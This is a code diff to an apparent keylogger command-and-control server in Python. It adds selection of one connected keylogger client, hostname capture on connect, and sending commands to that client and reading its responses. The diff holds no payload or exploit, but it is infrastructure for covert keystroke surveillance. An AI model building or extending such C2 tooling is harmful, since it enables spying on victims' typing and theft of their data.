@@ -15,6 +15,18 @@ class Server(metaclass=MetaSingleton):
         self.host = host
         self.port = port
         self.clients = {}
+        self.__selected_keylogger = None
+
+    @property
+    def selected_keylogger(self):
+        return self.__selected_keylogger
+
+    @selected_keylogger.setter
+    def selected_keylogger(self, addr: tuple):
+        if addr not in self.clients:
+            self.__selected_keylogger = None
+        else:
+            self.__selected_keylogger = addr
 
     async def disconnect_client(self, addr: tuple):
         if addr in self.clients:
@@ -25,13 +37,12 @@ class Server(metaclass=MetaSingleton):
         else:
             logger.error(f'Client {addr} not found')
 
-    async def read_response(self, addr: tuple):
+    async def read_response(self, addr: tuple, buffer: int = BUFFER, timeout: float = TIMEOUT):
         response = b''
         reader, _ = self.clients[addr]
         while True:
             try:
-                print(self.clients.keys())
-                answer = await asyncio.wait_for(reader.read(self.BUFFER), self.TIMEOUT)
+                answer = await asyncio.wait_for(reader.read(buffer), timeout)
                 if not answer:
                     logger.debug(f'answer b"", client {addr} close connect')
                     break
@@ -52,15 +63,22 @@ class Server(metaclass=MetaSingleton):
             logger.error(f'Connection close {addr}: {e}')
             await self.disconnect_client(addr)
 
-    async def request(self, addr: tuple, command: Command):
-        if addr in self.clients:
-            await self.send_command(addr, command)
-            return await self.read_response(addr)
+    async def request(self, command: Command):
+        if self.__selected_keylogger is None:
+            return
+        reader, _ = self.clients[self.__selected_keylogger]
+        if reader._waiter is not None:
+            return
+        await self.send_command(self.__selected_keylogger, command)
+        return await self.read_response(self.__selected_keylogger)
 
     async def handler(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         addr = writer.get_extra_info('peername')
         logger.info(f'client {addr} connect')
 
+        hostname = await asyncio.wait_for(reader.read(256), .5)
+        hostname = hostname.decode().strip() if hostname else "Unknown"
+        addr = (hostname, *addr)
         if addr not in self.clients:
             self.clients[addr] = (reader, writer)
 
